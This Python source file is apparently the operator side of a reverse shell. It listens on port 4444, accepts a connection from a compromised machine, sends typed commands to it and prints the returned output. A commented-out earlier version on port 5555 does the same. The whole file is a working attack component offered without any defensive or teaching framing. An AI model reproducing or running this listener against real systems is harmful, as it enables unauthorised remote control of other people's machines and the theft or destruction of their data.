import socket


class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((ip, port))
        listener.listen(5)
        print("# Listening for stuff.")
        self.target, self.connection = listener.accept()

    def run(self):
        while True:
            command = input(f"me@{self.connection[0]}>> ")
            output = self.execute_remotely(command=command)
            print(output)

    def execute_remotely(self, command):
        self.target.send(command.encode())
        receive = self.target.recv(1024).decode()
        return receive


client = Listener('0.0.0.0', 4444)
client.run()

# def shell(computer, address):
#     while True:
#         command = input(f"Shell@{address[0]}~  ")
#         computer.send(command.encode())
#         receive_output(computer)
#
#
# def receive_output(computer):
#     receive = computer.recv(1024).decode()
#     print(f"#output {receive}")
#
#
# socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# socket.bind(('0.0.0.0', 5555))
# print("# Listening for stuff")
# socket.listen(5)
#
# target, ip = socket.accept()
# print(f"Connected from {ip}")
#
# shell(target, ip)
#
# # closed the connection
# socket.close()
